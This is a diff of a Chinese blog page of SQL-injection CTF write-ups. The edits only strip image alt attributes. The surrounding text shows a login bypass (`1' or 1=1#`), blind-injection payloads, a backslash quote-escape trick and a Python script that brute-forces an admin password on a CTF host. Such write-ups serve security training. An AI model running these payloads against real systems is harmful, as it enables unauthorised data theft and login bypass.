@@ -49,18 +49,18 @@
 <p>得到flag</p>
 <h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p>
 <p>界面：</p>
-<img src="https://i.loli.net/2020/03/27/fC6dephA2EGPTkt.png" alt="SWPU2019-Web1" style="zoom: 67%;" />
+<img src="https://i.loli.net/2020/03/27/fC6dephA2EGPTkt.png" style="zoom: 67%;" />
 
 <p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p>
 <p>登录后界面：</p>
 <p><img src="https://i.loli.net/2020/03/27/y3YFO5dUm164Vbf.png" alt=""></p>
 <p>广告申请界面：</p>
-<img src="https://i.loli.net/2020/03/27/CYufWMHk5dvQZXp.png" alt="image-20200203114757380" style="zoom:67%;" />
+<img src="https://i.loli.net/2020/03/27/CYufWMHk5dvQZXp.png" style="zoom:67%;" />
 
 <p>随便申请一个：</p>
 <p><img src="https://i.loli.net/2020/03/27/JdWt2SMC1DfKNvj.png" alt=""></p>
 <p>首页显示：</p>
-<img src="D:\Blog\source\_posts\SQL注入.assets\image-20200203114846869.png" alt="image-20200203114846869" style="zoom:67%;" />
+<img src="D:\Blog\source\_posts\SQL注入.assets\image-20200203114846869.png" style="zoom:67%;" />
 
 <p>广告详情：</p>
 <p><img src="https://i.loli.net/2020/03/27/MrPNK86afEWqQLj.png" alt=""></p>
@@ -298,10 +298,10 @@
 <p><img src="https://i.loli.net/2020/03/27/UoGTZ8HB9c7KlQ3.png" alt=""></p>
 <h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">Smi1e</a></p>
 <p>界面：</p>
-<img src="https://i.loli.net/2020/03/27/tQegj4JmCsGbTXp.png" alt="image-20200224095042456" style="zoom:50%;" />
+<img src="https://i.loli.net/2020/03/27/tQegj4JmCsGbTXp.png" style="zoom:50%;" />
 
 <p>FUZZ测试后发现</p>
-<img src="https://i.loli.net/2020/03/27/7UIS3oMv6DWqsj8.png" alt="image-20200224100832694" style="zoom:80%;" />
+<img src="https://i.loli.net/2020/03/27/7UIS3oMv6DWqsj8.png" style="zoom:80%;" />
 
 <p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/" target="_blank" rel="noopener">参考</a></p>
 <p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p>
@@ -311,10 +311,10 @@
 
 <p>得到两个列名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p>
 <p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">参考</a>，如图</p>
-<img src="https://i.loli.net/2020/03/27/sFLidjDgr5weSft.png" alt="image-20200224131013444" style="zoom: 80%;" />
+<img src="https://i.loli.net/2020/03/27/sFLidjDgr5weSft.png" style="zoom: 80%;" />
 
 <p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p>
-<img src="https://i.loli.net/2020/03/27/JIK9gluR1khN6zr.png" alt="image-20200224131643156" style="zoom:80%;" />
+<img src="https://i.loli.net/2020/03/27/JIK9gluR1khN6zr.png" style="zoom:80%;" />
 
 <p>注：出题人这里还有一个坑，详见题目下方的链接</p>
 <p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p>
@@ -325,7 +325,7 @@
 
 <p>最终可以得到flag</p>
 <h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>界面：</p>
-<img src="https://i.loli.net/2020/03/27/9WpDyf1SxXoMCrH.png" alt="image-20200224213301224" style="zoom:80%;" />
+<img src="https://i.loli.net/2020/03/27/9WpDyf1SxXoMCrH.png" style="zoom:80%;" />
 
 <p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p>
 <p><img src="https://i.loli.net/2020/03/27/tuM3g2DS8hEQ1WL.png" alt=""></p>
@@ -402,11 +402,11 @@
 <p><img src="https://i.loli.net/2020/03/27/RvGOsyKqSXYNEug.png" alt=""></p>
 <h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p>
 <p>参考：<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p>
-<img src="https://i.loli.net/2020/03/27/irSKxC2d6QBnVu7.png" alt="image-20200323203842474" style="zoom:50%;" />
+<img src="https://i.loli.net/2020/03/27/irSKxC2d6QBnVu7.png" style="zoom:50%;" />
 
 <p>这题看着界面有点眼熟，这这个网站上有个类似的题<a href="http://pcat.cc/q.php" target="_blank" rel="noopener">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p>
 <p>先fuzz一下，以下字符被过滤：</p>
-<img src="https://i.loli.net/2020/03/27/FnfpO9AMlex8UdC.png" alt="image-20200323204336331" style="zoom: 80%;" />
+<img src="https://i.loli.net/2020/03/27/FnfpO9AMlex8UdC.png" style="zoom: 80%;" />
 
 <p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p>
 <p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p>
@@ -414,7 +414,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'1\'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">' or 1#'</span></span><br></pre></td></tr></table></figure>
 
 <p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p>
-<img src="D:\Blog\source\_posts\SQL注入.assets\image-20200323205329926.png" alt="image-20200323205329926" style="zoom: 50%;" />
+<img src="D:\Blog\source\_posts\SQL注入.assets\image-20200323205329926.png" style="zoom: 50%;" />
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn/index.php"</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">str1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line">pass1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        pass1 = <span class="string">'0x5E'</span> + passwd.replace(<span class="string">'0x5E'</span>,<span class="string">''</span>) + hex(ord(j)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">        payload = <span class="string">' or password regexp binary &#123;&#125;#'</span>.format(pass1)</span><br><span class="line">        <span class="comment">#print(pass1)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'1\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=header)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'BJD needs'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd = passwd + hex(ord(j)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
@@ -443,7 +443,7 @@
 
 <p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p>
 <p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p>
-<img src="https://i.loli.net/2020/03/27/gKbs6mkaDcpUx5W.png" alt="image-20200224085735781" style="zoom: 80%;" />
+<img src="https://i.loli.net/2020/03/27/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" />
 
 <p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p>
 <p>regexp后所跟的东西作为正则表达式处理。</p>
@@ -540,7 +540,7 @@
 </blockquote>
 </blockquote>
 <p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p>
-<img src="https://i.loli.net/2020/03/27/XHqfk2AmYUGvNyr.png" alt="image-20200202205408575" style="zoom:67%;" />
+<img src="https://i.loli.net/2020/03/27/XHqfk2AmYUGvNyr.png" style="zoom:67%;" />
 
 <p>于是这时输入password=1即可绕过查询得到flag</p>
 </div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Extrader</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.extrader.top/2020/03/22/SQL%E6%B3%A8%E5%85%A5/">https://www.extrader.top/2020/03/22/SQL%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.extrader.top">Extrader</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF%E9%A2%98/">CTF题</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/22/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa fa-chevron-left">  </i><span>反序列化</span></a></div><div class="next-post pull-right"><a href="/2020/03/22/%E5%85%B6%E5%AE%83/"><span>其它</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
